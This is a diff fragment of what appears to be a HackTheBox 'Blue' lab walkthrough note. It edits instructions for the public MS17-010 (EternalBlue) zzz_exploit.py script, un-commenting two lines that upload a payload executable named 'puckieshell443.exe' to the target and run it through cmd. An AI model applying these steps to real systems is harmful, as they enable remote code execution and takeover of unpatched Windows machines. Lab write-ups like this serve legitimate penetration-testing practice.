@@ -57,11 +57,8 @@ git clone https://github.com/worawit/MS17-010.git
 * zzz_exploit.py:
  * If needed USERNAME-"//"
  * next add the following 2 lines to below def smb
- 
-   '''
    
    smb_send_file(smbConn, '/root/htb/blue/puckieshell443.exe', 'C', '/puckieshell443.exe')
    service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
-   
-   '''
+
  
